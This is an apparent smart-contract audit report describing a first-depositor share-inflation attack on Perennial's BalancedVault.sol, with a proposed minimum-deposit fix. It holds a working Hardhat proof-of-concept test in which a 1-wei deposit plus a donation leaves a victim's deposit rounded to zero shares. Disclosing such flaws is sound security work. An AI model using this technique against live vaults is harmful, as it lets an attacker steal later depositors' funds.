roguereddwarf

medium

# BalancedVault.sol: Early depositor can manipulate exchange rate and steal funds

## Summary
The first depositor can mint a very small number of shares, then donate assets to the Vault.
Thereby he manipulates the exchange rate and later depositors lose funds due to rounding down in the number of shares they receive.

The currently deployed Vaults already hold funds and will merely be upgraded to V2. However as Perennial expands there will surely be the need for more Vaults which enables this issue to occur.

## Vulnerability Detail
You can add the following test to `BalancedVaultMulti.test.ts`.
Make sure to have the `dsu` variable available in the test since by default this variable is not exposed to the tests.

The test is self-explanatory and contains the necessary comments:

```javascript
it('exchange rate manipulation', async () => {
      const smallDeposit = utils.parseEther('1')
      const smallestDeposit = utils.parseEther('0.000000000000000001')

      // make a deposit with the attacker. Deposit 1 Wei to mint 1 Wei of shares
      await vault.connect(user).deposit(smallestDeposit, user.address)
      await updateOracle();
      await vault.sync()

      console.log(await vault.totalSupply());

      // donating assets to Vault
      await dsu.connect(user).transfer(vault.address, utils.parseEther('1'))

      console.log(await vault.totalAssets());

      // make a deposit with the victim. Due to rounding the victim will end up with 0 shares
      await updateOracle();
      await vault.sync()
      await vault.connect(user2).deposit(smallDeposit, user2.address)
      await updateOracle();
      await vault.sync()

      console.log(await vault.totalAssets());
      console.log(await vault.totalSupply());
      // the amount of shares the victim receives is rounded down to 0
      console.log(await vault.balanceOf(user2.address));

      /*
      at this point there are 2000000000000000001 Wei of assets in the Vault and only 1 Wei of shares
      which is owned by the attacker.
      This means the attacker has stolen all funds from the victim.
      */
    })
```

## Impact
The attacker can steal funds from later depositors.

## Code Snippet
https://github.com/sherlock-audit/2023-05-perennial/blob/main/perennial-mono/packages/perennial-vaults/contracts/balanced/BalancedVault.sol#L775-L778

## Tool used
Manual Review

## Recommendation
This issue can be mitigated by requiring a minimum deposit of assets.
Thereby the attacker cannot manipulate the exchange rate to be so low as to enable this attack.